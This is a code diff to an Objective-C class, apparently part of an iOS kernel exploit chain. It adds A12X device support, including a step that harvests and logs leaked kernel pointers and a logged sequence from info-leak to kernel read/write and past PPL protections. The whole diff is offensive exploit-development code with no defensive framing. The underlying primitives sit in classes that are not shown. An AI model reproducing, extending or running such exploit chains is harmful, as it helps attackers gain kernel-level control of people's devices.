@@ -21,7 +21,7 @@
 #include <string.h>
 #include <unistd.h>
 
-#define KRW_BUILD @"hunt-krw-4"
+#define KRW_BUILD @"hunt-krw-5"
 
 @implementation P007KernelChain
 
@@ -60,7 +60,8 @@
     if (p100.length) [LabLearn ingestIdent:[LabDeviceProfile identBlock]];
 
     L(@"[STEP 2] P139 boot intel (no 150s lock/unlock)");
-    if (sku == LabSkuA14_23F77 || sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other) {
+    if (sku == LabSkuA14_23F77 || sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other
+        || LabSkuIsA12X(sku)) {
         NSString *p139 = nil;
         @try { p139 = [P139BootIntel tap]; }
         @catch (NSException *e) { L([NSString stringWithFormat:@"[-] p139 %@", e.name]); }
@@ -132,6 +133,25 @@
             L([NSString stringWithFormat:@"[*] libkrw P007LaneArmBoard %@",
                armed ? @"YES" : @"miss (stock / no provider)"]);
         }
+    } else if (LabSkuIsA12X(sku)) {
+        P007Board *disc = [P007Board shared];
+        L(@"[*] A12X DISCLOSE = P010 QueueCreate copyout (P139 harvest 3) + P063 aio HEAP (harvest 1).");
+        L(@"[*] SKIP P044/P099/P073 254 — 43748 patched in 26.6; fill_cap=1; remaining-fire is MAF or 0xe00002c2.");
+        L(@"[*] 64788 Facet A live until 23G82. 23H30 P065 is EXPECT-BAD oracle. hop-1 EINVAL since 26.1.");
+        L(@"[*] PPL-only AfterKread (no SPTM). That helps after hasKread. First KRW is still disclose→convert→Arm→kread32.");
+        L([LabDeviceProfile armDump]);
+        L([NSString stringWithFormat:@"[*] board leaks after harvest unique=%lu (P010/P063 KPTR hits)",
+           (unsigned long)disc.leaks.count]);
+        NSUInteger shown = 0;
+        for (NSDictionary *e in disc.leaks) {
+            if (shown >= 8) break;
+            if (![e isKindOfClass:[NSDictionary class]]) continue;
+            L([NSString stringWithFormat:@"  leak[%lu] %@ kind=%@ src=%@",
+               (unsigned long)shown, e[@"va"] ?: @"?", e[@"kind"] ?: @"?", e[@"source"] ?: @"?"]);
+            shown++;
+        }
+        L(@"[*] CS2 phys_oob READ scan is catalog-solo. kbase=0 is setup. Do not fuse iPad READ with iPhone WRITE.");
+        L(@"[*] SocketKRW.Arm HOLD — no rw_inpcb KVA. conversion unnamed.");
     } else {
         L([NSString stringWithFormat:@"[*] no occupancy door on %@", skuName]);
     }
@@ -156,6 +176,9 @@
         L(@"[*] PIPE-HIT / QUEUE-INIT is a write receipt, not kread32. P110 catalog-solo. AfterKread HOLD.");
     } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
         L(@"[*] 12 mini / A13 FORMULA: CS2/libkrw → kread32 → AfterKread FIRE. Staging files ≠ jailbreak.");
+    } else if (LabSkuIsA12X(sku)) {
+        L(@"[*] A12X FORMULA: disclose(P010/P063 via P139) → CS2 phys_oob READ (catalog) → convert unnamed → SocketKRW.Arm(rw_inpcb) → kread32 → PPL AfterKread.");
+        L(@"[*] 254 remaining-fire is not this chain. PPL-only is AfterKread, not first KRW.");
     }
 
     if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
